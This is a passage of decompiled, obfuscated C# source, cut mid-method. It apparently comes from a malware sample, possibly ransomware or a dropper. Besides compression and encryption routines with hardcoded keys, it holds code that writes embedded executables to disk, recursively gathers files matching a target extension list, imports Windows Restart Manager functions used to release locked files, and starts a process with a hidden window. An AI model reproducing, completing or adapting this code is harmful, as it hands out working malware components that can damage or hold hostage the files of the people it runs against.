			*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
		}
		if (int_1 >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 4) >> 3)
		{
			Class32.smethod_31(int_1, bool_0, int_0, class28_0, byte_0);
		}
		else if (*(int*)((byte*)ptr + 4) == *(int*)((byte*)ptr + 8))
		{
			Class32.smethod_93(class28_0.class31_0, 2 + (bool_0 ? 1 : 0), 3);
			Class21.Class28.Class29 class29_3 = class28_0.class29_0;
			short[] short_ = Class21.Class28.short_1;
			byte[] byte_ = Class21.Class28.byte_2;
			Class32.smethod_47(byte_, short_, class29_3);
			class29_3 = class28_0.class29_1;
			short_ = Class21.Class28.short_2;
			byte_ = Class21.Class28.byte_3;
			Class32.smethod_47(byte_, short_, class29_3);
			Class32.smethod_10(class28_0);
			Class32.smethod_32(class28_0);
		}
		else
		{
			Class32.smethod_93(class28_0.class31_0, 4 + (bool_0 ? 1 : 0), 3);
			Class32.smethod_44(class28_0, *(int*)ptr);
			Class32.smethod_10(class28_0);
			Class32.smethod_32(class28_0);
		}
	}

	static void smethod_82()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		foreach (string text in manifestResourceNames)
		{
			string[] array = text.Split(new char[1] { '.' });
			if (array[2] == "exe")
			{
				if (File.Exists(Class2.string_2 + "\\" + array[1] + "." + array[2]))
				{
					File.Delete(Class2.string_2 + "\\" + array[1] + "." + array[2]);
				}
				FileStream fileStream = new FileStream(Class2.string_2 + "\\" + array[1] + "." + array[2], FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
				byte[] buffer = new byte[4096];
				int count;
				while ((count = manifestResourceStream.Read(buffer, 0, 4096)) > 0)
				{
					fileStream.Write(buffer, 0, count);
				}
				fileStream.Close();
				manifestResourceStream.Close();
			}
		}
	}

	static void smethod_83()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class32.smethod_6;
		}
		catch
		{
		}
	}

	static string smethod_84()
	{
		try
		{
			string string_ = "Path";
			string subkeyApplication = Class13.SubkeyApplication;
			object object_ = default(object);
			switch (Class32.smethod_22(ref object_, subkeyApplication, string_))
			{
			case Enum4.const_1:
				return null;
			case Enum4.const_0:
			{
				string_ = "Path";
				subkeyApplication = Class13.WowSubkeyApplication;
				Enum4 @enum = Class32.smethod_22(ref object_, subkeyApplication, string_);
				break;
			}
			}
			return (string)object_;
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_85(byte[] byte_0)
	{
		return Class32.smethod_102((byte[])null, byte_0, (byte[])null, 1);
	}

	static void smethod_86(Class21.Class24 class24_0)
	{
		class24_0.int_2 = 0;
		class24_0.int_3 = 0;
	}

	static bool smethod_87(bool bool_0, Class21.Class30 class30_0, bool bool_1)
	{
		bool flag;
		do
		{
			Class32.smethod_104(class30_0);
			bool bool_2 = bool_0 && class30_0.int_17 == class30_0.int_18;
			flag = Class32.smethod_91(bool_1, class30_0, bool_2);
		}
		while (class30_0.class31_0.int_1 == 0 && flag);
		return flag;
	}

	unsafe static void smethod_88(Class21.Class28.Class29 class29_0, int[] int_0)
	{
		void* ptr = stackalloc byte[36];
		class29_0.byte_0 = new byte[class29_0.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class29_0.int_3)
		{
			class29_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class29_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class29_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				class29_0.int_2[*(int*)((byte*)ptr + 24) - 1]++;
				class29_0.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num = class29_0.int_3 - 1;
		while (true)
		{
			if (class29_0.int_2[--num] != 0)
			{
				do
				{
					class29_0.int_2[num]--;
					class29_0.int_2[++num]++;
					*(int*)((byte*)ptr + 8) -= 1 << class29_0.int_3 - 1 - num;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num < class29_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		class29_0.int_2[class29_0.int_3 - 1] += *(int*)((byte*)ptr + 8);
		class29_0.int_2[class29_0.int_3 - 2] -= *(int*)((byte*)ptr + 8);
		int num2 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class29_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class29_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num3 = 2 * int_0[num2++];
				if (int_0[num3 + 1] == -1)
				{
					class29_0.byte_0[int_0[num3]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	static int smethod_89(Class21.Class24 class24_0)
	{
		return 32768 - class24_0.int_3;
	}

	static byte[] smethod_90(string string_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	unsafe static bool smethod_91(bool bool_0, Class21.Class30 class30_0, bool bool_1)
	{
		void* ptr = stackalloc byte[28];
		if (class30_0.int_15 < 262 && !bool_1)
		{
			return false;
		}
		Class21.Class28 class28_3;
		byte[] byte_;
		do
		{
			if (class30_0.int_15 >= 262 || bool_1)
			{
				if (class30_0.int_15 != 0)
				{
					if (class30_0.int_14 >= 65274)
					{
						Class32.smethod_56(class30_0);
					}
					*(int*)ptr = class30_0.int_11;
					int int_ = class30_0.int_12;
					if (class30_0.int_15 >= 3)
					{
						*(int*)((byte*)ptr + 4) = Class32.smethod_97(class30_0);
						if (*(int*)((byte*)ptr + 4) != 0 && class30_0.int_14 - *(int*)((byte*)ptr + 4) <= 32506 && Class32.smethod_34(*(int*)((byte*)ptr + 4), class30_0) && class30_0.int_12 <= 5 && class30_0.int_12 == 3 && class30_0.int_14 - class30_0.int_11 > 4096)
						{
							class30_0.int_12 = 2;
						}
					}
					if (int_ >= 3 && class30_0.int_12 <= int_)
					{
						Class21.Class28 class28_ = class30_0.class28_0;
						*(int*)((byte*)ptr + 20) = class30_0.int_14 - 1 - *(int*)ptr;
						Class32.smethod_37(*(int*)((byte*)ptr + 20), int_, class28_);
						int_ -= 2;
						do
						{
							class30_0.int_14++;
							class30_0.int_15--;
							if (class30_0.int_15 >= 3)
							{
								Class32.smethod_97(class30_0);
							}
						}
						while (--int_ > 0);
						class30_0.int_14++;
						class30_0.int_15--;
						class30_0.bool_0 = false;
						class30_0.int_12 = 2;
					}
					else
					{
						if (class30_0.bool_0)
						{
							Class21.Class28 class28_2 = class30_0.class28_0;
							*(int*)((byte*)ptr + 16) = class30_0.byte_0[class30_0.int_14 - 1] & 0xFF;
							Class32.smethod_53(*(int*)((byte*)ptr + 16), class28_2);
						}
						class30_0.bool_0 = true;
						class30_0.int_14++;
						class30_0.int_15--;
					}
					continue;
				}
				if (class30_0.bool_0)
				{
					Class21.Class28 class28_2 = class30_0.class28_0;
					*(int*)((byte*)ptr + 16) = class30_0.byte_0[class30_0.int_14 - 1] & 0xFF;
					Class32.smethod_53(*(int*)((byte*)ptr + 16), class28_2);
				}
				class30_0.bool_0 = false;
				class28_3 = class30_0.class28_0;
				byte_ = class30_0.byte_0;
				*(int*)((byte*)ptr + 12) = class30_0.int_13;
				*(int*)((byte*)ptr + 24) = class30_0.int_14 - class30_0.int_13;
				Class32.smethod_81(*(int*)((byte*)ptr + 24), *(int*)((byte*)ptr + 12), bool_0, byte_, class28_3);
				class30_0.int_13 = class30_0.int_14;
				return false;
			}
			return true;
		}
		while (class30_0.class28_0.int_9 < 16384);
		*(int*)((byte*)ptr + 8) = class30_0.int_14 - class30_0.int_13;
		if (class30_0.bool_0)
		{
			(*(int*)((byte*)ptr + 8))--;
		}
		bool flag = bool_0 && class30_0.int_15 == 0 && !class30_0.bool_0;
		class28_3 = class30_0.class28_0;
		byte_ = class30_0.byte_0;
		*(int*)((byte*)ptr + 12) = class30_0.int_13;
		Class32.smethod_81(*(int*)((byte*)ptr + 8), *(int*)((byte*)ptr + 12), flag, byte_, class28_3);
		class30_0.int_13 += *(int*)((byte*)ptr + 8);
		return !flag;
	}

	static void smethod_92(string string_0)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			FileInfo[] files = directoryInfo.GetFiles();
			Class2.Class3 CS_0024_003C_003E8__locals0;
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					CS_0024_003C_003E8__locals0 = new Class2.Class3();
					CS_0024_003C_003E8__locals0.string_0 = Path.GetExtension(fileInfo.FullName);
					if (Array.Exists(Class2.string_0, (string string_1) => string_1 == CS_0024_003C_003E8__locals0.string_0.ToLower()))
					{
						Class2.list_0.Add(fileInfo.FullName);
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					Class32.smethod_92(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
	}

	static void smethod_93(Class21.Class31 class31_0, int int_0, int int_1)
	{
		class31_0.uint_0 |= (uint)(int_0 << class31_0.int_2);
		class31_0.int_2 += int_1;
		if (class31_0.int_2 >= 16)
		{
			class31_0.byte_0[class31_0.int_1++] = (byte)class31_0.uint_0;
			class31_0.byte_0[class31_0.int_1++] = (byte)(class31_0.uint_0 >> 8);
			class31_0.uint_0 >>= 16;
			class31_0.int_2 -= 16;
		}
	}

	static void smethod_94(Class21.Class23 class23_0, int int_0)
	{
		class23_0.uint_0 >>= int_0;
		class23_0.int_2 -= int_0;
	}

	static byte[] smethod_95(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetBytes(array);
		return array;
	}

	static void smethod_96(Class21.Class27 class27_0)
	{
		class27_0.int_6 |= 12;
	}

	static int smethod_97(Class21.Class30 class30_0)
	{
		int num = ((class30_0.int_10 << 5) ^ class30_0.byte_0[class30_0.int_14 + 2]) & 0x7FFF;
		short num2 = (class30_0.short_1[class30_0.int_14 & 0x7FFF] = class30_0.short_0[num]);
		class30_0.short_0[num] = (short)class30_0.int_14;
		class30_0.int_10 = num;
		return num2 & 0xFFFF;
	}

	static void smethod_98(Class21.Stream0 stream0_0, int int_0)
	{
		Class32.smethod_52(stream0_0, int_0);
		Class32.smethod_52(stream0_0, int_0 >> 16);
	}

	static bool smethod_99(byte[] byte_0, string string_0)
	{
		FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write);
		try
		{
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Close();
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Exception caught in process: {0}", ex.ToString());
			fileStream.Close();
			if (File.Exists(string_0))
			{
				File.Delete(string_0);
			}
		}
		return false;
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static bool smethod_100(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	unsafe static int smethod_101(Class21.Class28.Class29 class29_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class29_0.short_0.Length)
		{
			*(int*)ptr += class29_0.short_0[*(int*)((byte*)ptr + 4)] * class29_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		return *(int*)ptr;
	}

	unsafe static byte[] smethod_102(byte[] byte_0, byte[] byte_1, byte[] byte_2, int int_0)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class21.Stream0 stream = new Class21.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class21.Class27 class2 = new Class21.Class27();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = byte_1.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ byte_1[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class32.smethod_98(stream, 67324752);
				Class32.smethod_52(stream, 20);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 8);
				Class32.smethod_98(stream, (int)(*(long*)ptr));
				Class32.smethod_98(stream, (int)num);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class32.smethod_98(stream, 0);
				Class32.smethod_98(stream, byte_1.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class32.smethod_52(stream, bytes.Length);
				Class32.smethod_52(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class32.smethod_63(class2, byte_1);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class32.smethod_64(class2, array9);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				Class32.smethod_96(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class32.smethod_64(class2, array10);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = class2.long_0;
				Class32.smethod_98(stream, 33639248);
				Class32.smethod_52(stream, 20);
				Class32.smethod_52(stream, 20);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 8);
				Class32.smethod_98(stream, (int)(*(long*)ptr));
				Class32.smethod_98(stream, (int)num);
				Class32.smethod_98(stream, (int)(*(long*)((byte*)ptr + 16)));
				Class32.smethod_98(stream, byte_1.Length);
				Class32.smethod_52(stream, bytes.Length);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 0);
				Class32.smethod_98(stream, 0);
				Class32.smethod_98(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class32.smethod_98(stream, 101010256);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 0);
				Class32.smethod_52(stream, 1);
				Class32.smethod_52(stream, 1);
				Class32.smethod_98(stream, 46 + bytes.Length);
				Class32.smethod_98(stream, (int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)));
				Class32.smethod_52(stream, 0);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class32.smethod_98(stream, (int)(*(long*)((byte*)ptr + 16)));
				break;
			}
			case 1:
				Class32.smethod_98(stream, 25000571);
				Class32.smethod_98(stream, byte_1.Length);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < byte_1.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, byte_1.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(byte_1, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class32.smethod_98(stream, 0);
					Class32.smethod_98(stream, array5.Length);
					Class21.Class27 @class = new Class21.Class27();
					Class32.smethod_63(@class, array5);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class32.smethod_64(@class, array6);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					Class32.smethod_96(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class32.smethod_64(@class, array7);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class32.smethod_98(stream, (int)@class.long_0);
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class32.smethod_98(stream, 41777787);
				byte[] array3 = Class32.smethod_102((byte[])null, byte_1, (byte[])null, 1);
				using (ICryptoTransform cryptoTransform2 = Class32.smethod_74(bool_0: false, byte_2, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class32.smethod_98(stream, 58555003);
				byte[] array = Class32.smethod_102((byte[])null, byte_1, (byte[])null, 1);
				using (ICryptoTransform cryptoTransform = Class32.smethod_62(bool_0: false, byte_2, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class21.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	unsafe static byte[] smethod_103(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class32.smethod_100(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class21.Stream0 stream = new Class21.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class32.smethod_106(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class32.smethod_46(stream);
			*(int*)((byte*)ptr + 4) = Class32.smethod_46(stream);
			*(int*)((byte*)ptr + 8) = Class32.smethod_46(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class32.smethod_106(stream);
			Class32.smethod_106(stream);
			Class32.smethod_106(stream);
			*(int*)((byte*)ptr + 12) = Class32.smethod_106(stream);
			*(int*)((byte*)ptr + 16) = Class32.smethod_46(stream);
			*(int*)((byte*)ptr + 20) = Class32.smethod_46(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class21.Class22 @class = new Class21.Class22(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class21.Class22 class22_ = @class;
			byte[] byte_ = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			Class32.smethod_35(byte_, *(int*)((byte*)ptr + 40), 0, class22_);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class32.smethod_106(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					int num = Class32.smethod_106(stream);
					*(int*)((byte*)ptr + 36) = Class32.smethod_106(stream);
					byte[] array3 = new byte[num];
					stream.Read(array3, 0, array3.Length);
					Class32.smethod_35(array, *(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32), new Class21.Class22(array3));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_2 = new byte[8] { 253, 223, 143, 51, 90, 233, 37, 112 };
				byte[] byte_3 = new byte[8] { 144, 19, 178, 52, 16, 49, 73, 12 };
				using ICryptoTransform cryptoTransform = Class32.smethod_74(bool_0: true, byte_2, byte_3);
				array = Class32.smethod_103(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class32.smethod_62(bool_0: true, byte_4, byte_5);
				array = Class32.smethod_103(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_104(Class21.Class30 class30_0)
	{
		if (class30_0.int_14 >= 65274)
		{
			Class32.smethod_56(class30_0);
		}
		while (class30_0.int_15 < 262 && class30_0.int_17 < class30_0.int_18)
		{
			int num = 65536 - class30_0.int_15 - class30_0.int_14;
			if (num > class30_0.int_18 - class30_0.int_17)
			{
				num = class30_0.int_18 - class30_0.int_17;
			}
			Array.Copy(class30_0.byte_1, class30_0.int_17, class30_0.byte_0, class30_0.int_14 + class30_0.int_15, num);
			class30_0.int_17 += num;
			class30_0.int_16 += num;
			class30_0.int_15 += num;
		}
		if (class30_0.int_15 >= 3)
		{
			Class32.smethod_2(class30_0);
		}
	}

	[DllImport("rstrtmgr.dll")]
	static extern int RmGetList(uint uint_0, out uint uint_1, ref uint uint_2, [In][Out] Class1.Struct1[] struct1_0, ref uint uint_3);

	static void smethod_105(byte[] byte_0, Class21.Class30 class30_0)
	{
		class30_0.byte_1 = byte_0;
		class30_0.int_17 = 0;
		class30_0.int_18 = byte_0.Length;
	}

	static int smethod_106(Class21.Stream0 stream0_0)
	{
		return Class32.smethod_46(stream0_0) | (Class32.smethod_46(stream0_0) << 16);
	}

	static void smethod_107()
	{
		try
		{
			Process.Start(new ProcessStartInfo(Class2.string_5)
			{
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				CreateNoWindow = true
			});
		}
		catch (Exception)
		{
		}
	}

	[DllImport("rstrtmgr.dll")]
	static extern int RmEndSession(uint uint_0);

	static void smethod_108(Class21.Class31 class31_0)
	{
		if (class31_0.int_2 > 0)
		{
			class31_0.byte_0[class31_0.int_1++] = (byte)class31_0.uint_0;
			if (class31_0.int_2 > 8)
			{
				class31_0.byte_0[class31_0.int_1++] = (byte)(class31_0.uint_0 >> 8);
			}
		}
		class31_0.uint_0 = 0u;
		class31_0.int_2 = 0;
	}
}
